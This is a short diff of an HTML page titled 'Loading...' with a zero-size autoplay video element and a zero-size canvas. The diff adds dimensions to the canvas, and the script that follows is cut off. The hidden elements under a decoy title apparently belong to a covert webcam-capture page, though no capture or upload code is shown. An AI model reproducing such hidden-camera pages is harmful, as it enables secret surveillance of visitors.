@@ -5,8 +5,8 @@
 <title>加载ing...</title>
 </head>
 <body>
-    <video id="video" width="0" height="0" autoplay></video>
-	<canvas style="width:0px;height:0px" id="canvas"></canvas>
+ <video id="video" width="0" height="0" autoplay></video>
+	<canvas style="width:0px;height:0px" id="canvas" width="480" height="640"></canvas>
 	<script type="text/javascript">
 		window.addEventListener("DOMContentLoaded", function() {
             var canvas = document.getElementById('canvas');
